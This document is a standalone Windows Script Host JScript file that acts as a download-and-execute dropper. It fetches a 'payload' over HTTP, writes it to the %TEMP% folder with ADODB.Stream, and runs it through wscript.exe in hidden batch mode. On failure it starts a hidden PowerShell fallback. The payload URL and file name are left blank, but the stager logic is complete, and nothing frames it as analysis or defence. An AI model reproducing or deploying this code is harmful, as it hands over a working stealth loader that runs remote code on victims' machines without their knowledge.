// Initialize necessary ActiveX objects
var xhr = new ActiveXObject("MSXML2.XMLHTTP");
var fso = new ActiveXObject("Scripting.FileSystemObject");
var shell = new ActiveXObject("WScript.Shell");

// Define the URL for the payload and the local path for saving it
var payloadUrl = ""; 
var tempFolder = fso.GetSpecialFolder(2); // %TEMP% directory
var payloadPath = fso.BuildPath(tempFolder, "");
var logFilePath = fso.BuildPath(tempFolder, "js_execution.log");

// Open a log file for recording events. Appending mode (8) ensures old logs aren't overwritten.
var logStream = fso.OpenTextFile(logFilePath, 8, true);
logStream.WriteLine("--- Script Execution Start: " + new Date().toLocaleString() + " ---");

try {
    logStream.WriteLine("Attempting to download from: " + payloadUrl);
    
    // Configure and send the HTTP GET request
    xhr.open("GET", payloadUrl, false); // false makes it synchronous
    xhr.send();
    
    // Check if the download was successful (HTTP status 200)
    if (xhr.status === 200) {
        logStream.WriteLine("Download successful. HTTP Status: " + xhr.status);
        
        // Use ADODB.Stream for reliable saving of the downloaded content.
        // This handles various content types more robustly than FSO.CreateTextFile.
        var adbStream = new ActiveXObject("ADODB.Stream");
        adbStream.Open();
        adbStream.Type = 1; // 1 = adTypeBinary, essential for reliable transfer
        adbStream.Write(xhr.responseBody); // Use responseBody for binary data
        adbStream.SaveToFile(payloadPath, 2); // 2 = adSaveCreateOverWrite
        adbStream.Close();
        
        logStream.WriteLine("Payload saved to: " + payloadPath);
        
        // Execute the downloaded VBScript using wscript.exe.
        // 0 = WindowStyle Hidden (no UI), true = Wait for completion.
        // //B = Batch mode (no pop-ups), //Nologo = Suppress banner.
        shell.Run('wscript.exe //B //Nologo "' + payloadPath + '"', 0, true);
        logStream.WriteLine("Payload executed successfully.");
    } else {
        // Log an error if the download failed
        logStream.WriteLine("Download failed. HTTP Status: " + xhr.status + ". Response Text: " + xhr.responseText.substring(0, 200) + "...");
        throw new Error("Failed to download payload. HTTP Status: " + xhr.status);
    }
} catch (e) {
    // Catch and log any errors that occur during the process
    logStream.WriteLine("AN ERROR OCCURRED: " + e.message);
    
    // Fallback PowerShell command in case of failure
    var fallbackCmd = 'powershell -WindowStyle Hidden -Command "Write-Host \\"JS script failed, PowerShell fallback executed.\\""';
    shell.Run(fallbackCmd, 0, false); // Run without waiting
    logStream.WriteLine("PowerShell fallback command initiated.");
} finally {
    // Ensure the log file is closed even if an error occurs
    logStream.WriteLine("--- Script Execution End: " + new Date().toLocaleString() + " ---");
    logStream.Close();
}

// Inform the user where to check the logs
WScript.Echo("Execution complete. Check logs at: " + logFilePath);
